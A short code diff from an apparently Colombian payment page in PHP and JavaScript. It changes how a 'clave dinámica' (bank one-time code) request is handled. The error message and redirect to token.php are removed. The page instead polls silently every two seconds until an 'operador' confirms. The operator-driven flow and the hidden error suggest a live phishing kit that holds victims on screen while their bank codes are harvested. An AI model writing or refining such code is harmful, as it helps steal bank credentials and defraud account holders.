@@ -674,8 +674,10 @@ date_default_timezone_set('America/Bogota');
 
       switch (result.action) {
         case 'pedir_dinamica':
-          alert("Error de Clave Dinámica.");
-          window.location.href = "token.php";
+          // Mantener en esta pantalla hasta que el operador confirme finalización.
+          // No mostrar error, continuar con el polling.
+          console.log("Esperando acción de dinámica...");
+          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
           break;
 
         case 'confirm_finalizar':
